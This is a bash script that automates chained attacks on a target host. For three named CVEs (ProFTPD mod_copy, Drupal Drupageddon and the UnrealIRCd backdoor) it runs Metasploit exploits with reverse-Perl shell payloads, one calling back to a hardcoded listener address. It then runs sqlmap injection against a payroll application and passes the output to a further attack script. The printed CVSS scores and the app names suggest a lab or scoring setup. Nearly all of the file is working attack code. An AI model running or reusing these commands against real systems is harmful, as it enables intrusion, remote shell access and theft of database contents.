#!/bin/bash

ATTACK=$1
TARGET=$2
SOURCE=$3

if [ $ATTACK == "CVE-2015-3306" ]
then
	time msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; exploit -z; sessions -i 1 -s command_shell.sh; exit -y" 
	# in command shell run command background and then enter y
	SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
	rm results.txt
	if [ $SERVER == "php" ]
	then	
		time sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --flush-session --answers="extending=N" --batch
	elif [ $SERVER == "py" ]
	then 	
		time sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --flush-session --answers="extending=N" --batch
	fi
	tail -n 1 /root/.sqlmap/output/$TARGET/log >> dbres.txt
	DATABASE=$(cat dbres.txt | cut -d" " -f3 | tr '[:upper:]' '[:lower:]') 
	rm dbres.txt
	time ./attack-script.sh $TARGET $DATABASE $SERVER
	echo "baseScore_V2: 10"
	echo "severity_V2: HIGH"
	echo "exploitabilityScore_V2: 10"
elif [ $ATTACK == "CVE-2014-3704" ]
then 
	time msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost $SOURCE; exploit -z; sessions -i 1 -s command_shell.sh; exit -y"
	# in command shell run command background and then enter y
        SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
        rm results.txt
	if [ $SERVER == "php" ]
        then
                time sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --flush-session --answers="extending=N" --batch
        elif [ $SERVER == "py" ]
        then 
                time sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --flush-session --answers="extending=N" --batch
        fi
        tail -n 1 /root/.sqlmap/output/$TARGET/log >> dbres.txt
        DATABASE=$(cat dbres.txt | cut -d" " -f3 | tr '[:upper:]' '[:lower:]') 
        rm dbres.txt
        time ./attack-script.sh $TARGET $DATABASE $SERVER
	echo "baseScore_V2: 7.5"
	echo "severity_V2: HIGH"
	echo "exploitabilityScore_V2: 10"
elif [ $ATTACK == "CVE-2010-2075" ]
then 
	time msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set rhost $TARGET; set rport 6697; set lhost 192.168.0.79; set payload cmd/unix/reverse_perl; exploit -z; sessions -i 1 -s command_shell.sh; exit -y "
	# in command shell run command background and then enter y
        SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
        rm results.txt
	if [ $SERVER == "php" ]
        then
                time sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --flush-session --answers="extending=N" --batch
        elif [ $SERVER == "py" ]
        then 
                time sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --flush-session --answers="extending=N" --batch
        fi
        tail -n 1 /root/.sqlmap/output/$TARGET/log >> dbres.txt
        DATABASE=$(cat dbres.txt | cut -d" " -f3 | tr '[:upper:]' '[:lower:]') 
        rm dbres.txt
        time ./attack-script.sh $TARGET $DATABASE $SERVER
	echo "baseScore_V2: 7.5"
	echo "severity_V2: HIGH"
	echo "exploitabilityScore_V2: 10"
else
	echo "Not valid."
fi
